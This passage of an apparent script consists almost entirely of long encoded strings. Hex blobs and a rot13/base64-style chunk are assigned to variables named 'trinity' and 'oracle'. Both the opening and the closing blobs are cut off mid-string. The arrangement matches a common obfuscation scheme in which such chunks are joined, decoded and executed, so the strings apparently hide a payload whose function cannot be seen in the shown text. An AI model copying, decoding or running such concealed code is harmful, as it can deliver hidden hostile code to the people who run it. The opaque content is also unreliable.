zY3YTUzMzg1YTVhMzU2YTRjMzY0YjY2NTI2NjU1NDYzODU2NjYzNjY2NTA0ZjRhNjE3MzdhNTQzMDY4MzM2Zjc0MzkzMDZlMmI0OTQ0Nzg0MTZlNTk2MjY1NTc3ODQ2NjQ0NDM3NDk3MDc4NDM3NTczNzM1MjRmMmIzMDMxMzc2NzYyNzgzNjU1NzM0ZDQ3MzU0NzY2NWE1NzU5NDgyYjdhNTU1MDY2NDMzNjU0NWE3OTc4NzA0NDMxNmQ3ODQxNTc0OTQyMzE3NTRmNTI3YTMzNDE1NjZmNmM1ODY2NGQ1OTQ0MzQ0MTY5NzM2YTM3NmQ1MjJiNTcyZjRkNGI1OTc5MzczODQxNzY2ZjZmNjE0NDJiNjY2NTcxNmM0NzRmNGY1OTc4NDg0ODYxNmU1YTYyNTk1NzQ0NDE0ZjU5NGUzNjRkNDI2NTRlN2EzMDQxNGU2YzRmMzA2NzY1NGU1MzUzNjYzNDQ0MzY1Mjc1MzA3NTYyMzQzNzc3NTA3ODQ1MzA1NzM4MzU0NTZkNzY3MTcwNDY2ZTY3NTAzOTU1NmU0MTUyMzg2NzcyNjk1NjczMmIzNTU5NGUzMTU5NmMzMDUwMzc3NDZiNTUyYjc0NDgzMjczNTMyZjQyNTc3ODU4Nzk0NjY1NTQ0ZDc1NWE1MzUwMmI0NTc2MzIzNzdhNDQ3MzM1Mzk1MTUzNjM2YjQ4NGY2NTMxNjk0ZDY2NTE0YTJmMzA0MTM4NjE1MDYzNmY3ODUwNDc2NTYyNzY0NTc1NjQ2ZjY1Mzg1MjZjNjEzNDZlMmY3OTUwNjU3NzMwNzg2ODMyNDc0Mjc0MmY3ODMzNmU3NzY3MzA3YTY5NGY2NjUyNjM0ZDc0Mzc0MTdhNjg0MzZlNGI1MDY0NGIyZjRkMmI1NTRlNjM0ODY1NGY1MzJmNjk0Njc0NmE2Yzc1MmI0MTRkNzM2NDUwNjM0NjRjNzQ0NjQ4NGE0OTM0MzY0MTUwNzY1MzU0Nzg0NTM3NzE0NDJmNmE3NjZlMzIzNDY1NjY0NTY2NTk0Yjc2NDk0MjYzNmM2NTVhNjQyYjczNmQ1NDYzMzg0MzU3NjUzOTM0MmYzMTU0NDU1NjJmNDc2NTc5NGM3MzYzNGI2YzQ4NzI2NzRmMmY0OTM0MzQ3MTY1NmIzMzc4NDI2YjVhMmY1NjY0NTQ2YTcwNTE1NDYzNTM3YTc0Njk3NjYyNGY2NTQ5MzczMzMwNTM2NTM5NDU2NDJmNTI3ODY5NzY2MTc2NjM3YTYyNmY0NjMyNGM3NjY2NmU0NTZiMmY1MjQ2MzM2NzM4MzUzMTRjNDg2YjU1NjU0MTRjNTMyZjQ5NWE2MzYzNTE2ZjY2Mzg2MjU0Njk2NDY3NmUzNDM4NGI1MTY5MzEzODM5Mzc3NTczNmI3YTMwNmQ2MzY1NjU1MTQ0MzI0NTZiNzU2NDczNjEzNDY3MzM1NzM1MzM2ODY3NjY2ZjU4NjY2NzRiNmYzNDJmMzU2YzQ4Njk1MDRlNzE0Mjc5N2E2OTQ0NjY0NjY0NGM2NjRiNjczNTYyMzU0NzRjMzQ0YzcxNjk3MDY4MzA0YTQ0NzA2NDM1NzczMTM3MzkzMzQyNjg3ODZkNjU1MjQ2NjEzNzUxN2E3OTc0MzI2YTZlNDg3NjZiNDc1ODc4NmU3NjQzMmI1YTZiMmY3MDUyMzc3MzUzNTY2NTczNTI0MjRjNzY0NTZjMzQzNDQ5Njk3MjcxMzY0OTM2Nzk1NjY1NTk1MjMxNjk0Mjc4NmQ3NjM0N2EzMDMxNjY2MTQ5NjM2NjU5NmMzNjQ2NzI3OTQ1NzY0MTMxMzUzNDUwMzA1NDZkNTQ2NjZjNmEyZjY3NTA1MDM4NDg2NDM4NGQ2ZDRkNzY3NTY1NGEyZjUxNDczMzU1NTAyYjRkNzg3ODY5NDg2NjY5N2EzMjYzNjE1NDYzNjk0YjczNWE1OTMzNGM0Mjc0NGQ3OTRjNmQ0OTM5NTA0ODRhMzI3YTUwNmY0NDRmMzE3YTMxN2E0NTUwNTQyZjczNDc1MDM2NDk1MDMyNDEzODUyNzIzMjRjNGU2MzU1NmUyYjMwNmM1ODM3NmU1MTUyMzAzMDYzNGE0ODQ3NDc2NTUwNjU2NDYzNTI2ZDJmNmQzODUxNDg2Nzc1MzE2ODRlMzMyYjMzNjYyYjQ5NGU2OTU4NjU1NDQ1NTIyZjQ1NmI2ZTY0NTgzMjU5Njg2NjUyNjMzOTJiMmY3MzQxNmU0NDZlMzEzOTU5NGUzNDUxNjU1MzRhMzM2MTJmNmY0MjM4NmM1NjRmNmU0MzQxNTk0ODM3Njk0ZDM5NzM1ODM0NGE1ODY5NjU2NDUxMzM3MjQ2NDg3Nzc5NTY3MjZlMzU0ZDRmNDk0OTM0NmE2MjY3NTQ2NTYyNmUyYjcwNDY2ZTRhNDU2MzUxNmE3NzQxMmY1YTYxNzc1MDQ2NGY1MDQzNTE0YzMwNjg3NjcwMzA2YzMzNmQ2NTUzNDI3YTQ1NzUzNzVhNGEyYjUzN2E2YjQzNDM3OTRkMmI3MzY4MzQ0MTQ4NzEzNjZjNjI2OTQ0NzU3MTMxNmU1ODQ1NjIzOTcxNzk1MzJmMzAzMTc4NTg3NDZlNGE2ODc5NmE0NDJiNzc0ODY0NmY3MjYzNTk3NzMyNzg1ODJiNDk1MjM0NTk0NDJmNWE3ODMxMzE0ZDUwNjU1NzRjNjY2YzZlNTI1OTYzNTE2ODc5NzE0YTRhMzcyYjY5NTg3MzZjNjY2YTQ2NGY0ZDJmMzg1NDM1MzI2YTY5NzU2ZTY2Njk0NDZjMzAzOTY2NGEzMTc5NDkzMjVhNmE3NjY4NjM2NDU5NTAzNDc1MzQ3YTY0Nzg2NzM3NTk2YzUwNjczMzZjNjk0NTJiNDI3MDMyNDE2ZTM3MzQ0YTcyNjU1MzJmNzM0MzUwNzI3MTc0NjI3OTU4NjU1MTcyMzY0NjQ0NmI0MTc2MzI1MzMwNDU1NzJiNjc3YTQ4NDE2Njc4NmQ0ODM4NTE2YTMyNTE3MjUyMmIzNDY4NTQ2OTQ4Mzc3OTQ5NGY1MDZiNDYyYjc0NDc1ODU3NDI2Mzc5NGM2ZTc1NDE0NzU5NzM0ZDU2MzUzMTYxNGMyZjMzNjI1NTM4MzA2Zjc3MzQ2ZjZjMzE3NzM0Njc2NDRkMmI1YTcwN2E2NjY4NDQ3MjQ1NTQzNTRkMzk1YTYxNTkzMzMwNjE2YTMzNjg0MzJmNGE1NjMyN2EzNzJiNzgzMzY5NmY2YjRjNmQ3NjY5NjM1NjUwMzg0MTM3Njk0YzdhNzk0ZTRmNTQ1MjM1MmI1ODRjNDc3NTVhNjQzMDQ5NGYzNzQ0NDY3NjcxNzM0NDM3NWEzMzM0MzEzODM0NDYzNTM4NTI2YTY2NTQ3YTZiNTk3YTMxNGY3NjMyNTA0ZDVhNjQzMDcwMzEzMTQ3NDg0ZDUwMzk0YTU4NzQ1MzUwNjU2ZDQ1MzkzMjZhNzY3MjQ2NzQ2ODJmNGM2ZTZkMmI0ZTRkNTQ0ZjRkMzk1YTY2NmM0YzYzN2EyYjZhNzM3NzQ1Mzg2Mjc0NTI0ZTJmNDU1YTM4NTQ2ZTM5NGUzOTRiMzg0MzZjNmE2ZTUzNmMzNDcwNDkzNTVhNjg3ODZkNjk3NTMwNzI2NTc5MzM3NjRkNGQ2MTM2NTU2YTMzNzE3NjY2NGY2OTRjMzg1OTc2NmE0ZDQ5Mzk1MzdhNjg2YTUwNjg3NzMyNzcyZjZlNTE1YTZkMzU2Yzc2NmQ2NTY2NTgzNDZiNjM1OTU4MzI3MDU4MzQ2Nzc1NzU1NTJiNzA3NjJiNDY0ZDJiMzQ3MTM5Njg3YTQzNjY1NTQyMzM0NzQyMzM0NzJmNTI0NDMxNDgyZjMzNjgzOTMxNzQyYjQxNWEzNTZjMzM'
trinity = '2ZGWvZmN3ZQpkAQtmAQZ5ZmH1ZGL1AzLmBQZkAzH0ZmpmAGD3BQDlAQt1BGH3Zmt2AGLmAwHmBQZ3AwL1AmZkAQL3AGZ2AzH3LGExAGZmAmZ3AmV0LwL2Awp0LGZkAmL1ZQMvAmL3ZQD5AGx2Amp2AwHmAwp4ATR3AwpmAzDmAGH4AmD3AQHkAGD3AQHlAmV3BQp2ZmR3ZmWvZmt2LGH4AmV0LwEyAmR3ZwD3AmL1AGMuZmtmZmWzZmt0LmMyAJR0AGWzAmx3AmMwATZ2BGZjAmN0BQWvAQV1Amp5AzV2MQWvZmNmZwZ2AGx2AQZlAQH1ZQZ0Zmp3LGMzZzLmZGp4AzH0LwH4AGLmBGp3AGD2LGMyAzH2AmH0AGN1ZQp2AGxmAGD1ATZ2AGZ1AQDmBQEzZmDmAwD0AQVlLwpmAQDmAwp4AQV1AGWvAQx2MGL2AQx2AQZ2ZmN0BQpkATZ3AGD5AQxmAQpmAQZ0ZwL0AmVlLwH3AmL0LmEzAwx2AwD5AzVmAmpjATL1BGMuAQt2LwHlAwZ3ZwZjZmD2LGZkAwt1AQExAGL2MwMzAwL3AmZ4Zmt2MQZ0AzD2AGExZmRmAmH2Awx0BQEzZzL0AmWvAzZ3ZwMvAGxmZQp0ATD0AGH0Amt1ZQEzZmR3ZmWzZmD3Zmp1ATR3AwMxAGL0LwMyAQt0BQD4AwH1ZmZkAJR1ZwZ5AGD3ZwExAJRmAmDkAJR2LwH4AwH2LmL1AQR2MQZ2AzL1ZQZ0AmV2ZGLmAwD3ZwZkAzR2AwpmAmDmAmD4AmL0AmMwAQt3AmD5ZmRmZmZ0AzL3BQD4AwL0ZwZ1AzVmAmp5AwZ1AQWzAmt1ZQLmAmR0AmH1AwL2BQL2AzD0AQLmAzD2ZmZ5AGR3LGp4AGRmZwp1ATD2MGWzAGL3AwpkAGV3ZQHjZmD2AwpmAGZ3AGp1AmN2AQZ5AQHlMwpkAmLmZGDlAGp0MQWzZzV3AQp4AQtmAQMwZmH2AmWzAwt0AGLmAwt2Zwp4AmR0Awp3AGD3AGp4AmVmZmEwAJR2BQZmAGp1LGL1ATZ2ZwZmAGR1ZmIuZzL2LwL1AGtmAQZ4ZmR0MQZmAQp2AGEzZzV0LGD1Amp2AwZ3AwZ0LGZmAGN0AwplAzL2LmH0ATZ0MwLlAJR1BQD3AmN2MQZkAwt1AwZ0AzH3LGWzAmH2MGquAQR2MQZ1AGL0BGWzAzH3AmLkAmN1ZwZjAGt2AGL5ATR3AwDkAGZ2ZwMyAwp0MGMuAGt2MQEwAwZ1ZwHjAmp1BGExAzR2MGp1Amx2MwH2Zmp3BQZmATV3AwMxAQxlMwpmATDmBQL4AzH3ZQL5AzZ0ZGHjAmV1ZQEzAmR2AQL1AGVlMwp2AzV0BQZlAwZ0ZGWvAGNmZQL4ATRmBGEwZmD3AQLkAwRmBQZlAGZmBQMzAGD3BGD5AGZ3BQL4AGt2ZGD5AwH3ZmLlZmV2AmWzAmD0AwWzAzD1BQWzAzL1AQZ2A2R0LGL5AGp3Zmp4Zmp1BGD0Amt2BQD4AQD3AmEuAmL3ZmH2AwRlMwWzAzRmBGp0ZmtlLwHjZmDlLwH4ZmDmZwH4ATD0AQZ4ZmL3LGp2AGD2AGH4AwZ1BQH4AmxmAwEuAmx2AQZlAwRlMwp4ATH0BQDmAmH3BQMyAQt2MwZ3ATL0BQZ1Awt0MwH4AQH3LGLmAGt3BQL1ZmxmAQIuAwxmZwD2AzR1Zwp2AGD2AmZ3AGp1AmD0AGN1BGp2ZmZ2LmZkATVmAGIuZmZ0BQH4AmLmZGEuZmZ3AQZmATV0MwEuATDmZwquAmR1AmHlA2R1AGWvAQpmAQZ2AwZ1AwD1ZmpmBGZjZmt3ZwpkAmL2LwIuAQp0AGZ2ATDmBQL1ZmD2ZwZmATL2AwZkZzV0AmZ0AGt3ZmL0AwZ1AwZ5AwR2ZmZ1ZmtmZGZlZmt3ZGZ4ATH2AwH5A2R2LGZmAmp2BGZ1ZmtmZmD2AmHmAmp4AmZ3BQp2AGD2LwZ0AwD1AmH0ATH2AwZmZmD3ZwLkAmt1AmL0Amp3BQMuZmR2MQD1AGH2ZmH5ATLmBQDmZmD0AQH4AQV0LmH2AGN0MQZmATRmBQEzZmtmAwp1AzR2LwIuATZ3LGHjAwL1BGp3AGD2MGH5AmDmAwH5ZmN1ZmZkAwtlMwLmAGp0BQDlATD3LGWvAwZ1AQZ2Zmt0LGZ0ZmL0MQH4AGD3ZmZmAwV0AGL1AmL0AQZ4Amp0BQH4ZzV0LGZmZmL0MwpjAzV3BQH2AGx1BQZlATH2BQHjAQL3BGD4ATZ0MwMzAQRmAmp5AmZ3ZGL2AQVlMwH4AQL1AmZ4Awp0AQZ3Amx2MGp4AzR3ZQZ4Amx2BGZjAmx1LGMwAwp2MGp4AzR0AGEvAQtlMwEvAmN1ZQp3ZmZ3AQDlZmR0Mwp1AQtlLwpmAwV3AGEzZmH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'
oracle = 'c3ODZmNTgzNDJiNmQ0ZjM3MzU2NTYxNGUzNjRkNjM3NTYyNjU0NzMyNmY2NDM3NDcyZjU1NjY3NjJmMzkzMjJmNjQ2OTU2MzU3YTMzMzM0YzM3NmI0ZTc5MzYzMzczNDEzOTczNzg2MjRkNGU3YTU3Mzc2NTU4NjQ3MDdhNTE0ZjU5NTM2NTJiNGMzNjU1NGU3NjMyNDQ0YzY5NTMzMDQyMzk0YzU3NzQ0YzU0NTY0ZTRlNzM3NTcwNGQ0Zjc4NTA2MzRlMzI0YzRjNjY1NTMyNjE0YjU4NzQ3NDc4MzY3MDQ0NDE0YTQ4NjU2YTUyNTA2ZDUyNjI2YTM2MzEzMTMwNjgzNTM5NDc2MTRmNTg3MjU3MzU3MDY2NWE2NjUzNTQ3MDU3Nzg0YjM5NGIzMDQ4NDczNTMzNmUzOTY3MzI3YTRkNjM1NzQzNjI2NTY4NTM2MjM4N2E1YTU4NzMzNjZiMzc2MjJmNTc2NTY3MzQ1MTc5MzU3NDYyMzEzMzcwNzUzNzUxNzIzMjQ1NjI1MDMyNDM1YTY4NDcyZjRhNjc0MzM0MzE3YTRmNGE2ZDJmMzY0YjQzMzU3NDUwNTA1YTRlNzU1MDMyNGYzNzY0MzkzMjY0NTk2ZDZhNTc1MTc0Mzc2NTMwNmMzNjUyNjY2MzMzNmQ2NTcyNzc3NjY0NGQ2ZjU2NTU0ZjRkNTQzNzVhNjQ3NjQxNmY3MDdhNzY2NjcyN2E2YjJmNmY1NDY1NTM1NjZlNTIzNjYyNGE0ZTM3NjI1MDY0MzE2MjRjNzQ0YjY1MzgzMjU2NjQ3MTQ1NmM0ZTQzNGUzNTQ0MzI2Yzc1NzM2OTU3NGUzOTU1NmU3MjMyNDY2OTc5NTA1MzUxNTU0OTY0NGM0NzMyNDY0YzY4NjQ3NjM2NGEzNDM3NGE0ZTdhNjI1YTc4NGMzMzUxNTc2ZjYxMzI1MzM1Njk2ZTc0NTgzMjM3NzI0MzMwMzE0MzM2NDc2OTQ0NzQ3MzY2MzM2YjU1MzY2YTMyNTgzNDY5MmY1NzZiNzE2MjUzNGU3NTM1NTE3NTM5NmI2ZDMxNjU2MjM1NTI3MjY0NTQ0MzZjNmE1NTRiMzY0MjY0NjY0YTY0NTU2ZDYyNmI3NjZmNjk2YTU1MzM2ZjY3NmE2MjMxNmM0OTJmNzQ0NjMxNzY2MTZkNmY0ZjQ0MzUzNjY3NmE3NDcxNmQzNDU4NjMzNTMyNDIyZjU4NGUyYjVhNDg2NTRhNzY2MzUwNjI0OTYzNTc2MjQxNjQ1OTYyNGE3NDc5NDg3MDM1NTE2OTU5NTQ2MTc3NGM1OTM5MzIyYjc3NDQzNTJiMzI0ZTM4NzE2ZTU3NjI1MDc1NjY2Yzc0NDk2MTY3N2EzMjc3NzI1NTMyMzU2OTcwMzM2Yjc0NDM0ZTdhNzA0YjU1NTIzNzQxNzUzOTc5NzA0MzMyNmY2MjUzNjQ3MDQyNTg0NTc0NmE3MjYyNTM2MjYyNTE0NzcyNGE0ODc1Nzc1MDMyNGIyZjUzNTg0OTUyMmY3MDQzNTI1ODcwNmYzMjdhNTg2YjcxMzQ2ODRlNDU2YzU0MzI3NTZkNWEzMDRkNWE3MTc0NzI2ZDQ1NGU2NzUwMzk3MzMyMzA3MDYyNjE2ZDc4NjY2MzdhMzc2MTRmNGY2Yjc0NTg1MjczNjU1MjU4NzU1MzQyNGQ2NDM2NjE2OTZiMzgzNTQxNmQ3NzQyNjE2Zjc0NDQ1NTQ3MzI0Njc0NDY0Zjc4NzQ3MDU2NmQ3NzQ2NDM2MTMyNTE0ZTQ2NjEzMjM2NTk1MzJiNTIzNTcxNDE0ODc0NzM3NDYyNDc0ZDJiNzg3MzJiNDY2NDczNDIzNTUxMzYzNjMyNmE0ZjZkNGM2NjRiNzE3ODJmNTU0NjYxNGIzMTc1NjM2MjQ0NGY3NDc4NWEzOTQ5NDEzOTQ3NTA2NDcxMmY1MTQzNzI2NjY1NDk0ODUxNmU2ZjUyMzM2YzUxNmEzODUyNDc2N